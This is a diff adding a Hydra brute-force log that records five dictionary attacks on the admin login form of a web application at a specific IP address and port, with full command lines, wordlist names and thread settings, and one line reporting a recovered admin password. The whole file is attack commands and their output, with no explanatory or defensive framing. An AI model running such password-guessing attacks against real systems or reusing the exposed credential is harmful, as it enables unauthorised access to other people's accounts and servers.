@@ -1,0 +1,6 @@
+# Hydra v8.6 run at 2018-06-16 04:25:08 on 88.198.233.174 http-post-form (hydra -l admin -P 2151220-passwords.txt -s 37191 -o result.txt 88.198.233.174 http-post-form /index.php:user=^USER^&password=^PASS^:Invalid)
+# Hydra v8.6 run at 2018-06-16 04:29:39 on 88.198.233.174 http-post-form (hydra -l admin -P phpbb.txt -s 37191 -o result.txt 88.198.233.174 http-post-form /index.php:user=^USER^&password=^PASS^:Invalid)
+[37191][http-post-form] host: 88.198.233.174   login: admin   password: leonardo
+# Hydra v8.6 run at 2018-06-16 04:31:58 on 88.198.233.174 http-post-form (hydra -l admin -P 2151220-passwords.txt -s 37191 -o result.txt 88.198.233.174 http-post-form /index.php:user=^USER^&password=^PASS^:Invalid)
+# Hydra v8.6 run at 2018-06-16 04:32:50 on 88.198.233.174 http-post-form (hydra -l admin -P 2151220-passwords.txt -s 37191 -t 64 -o result.txt 88.198.233.174 http-post-form /index.php:user=^USER^&password=^PASS^:Invalid)
+# Hydra v8.6 run at 2018-06-16 04:41:50 on 88.198.233.174 http-post-form (hydra -l admin -P 2151220-passwords.txt -s 37191 -t 64 -o result.txt 88.198.233.174 http-post-form /index.php:user=^USER^&password=^PASS^:Invalid)
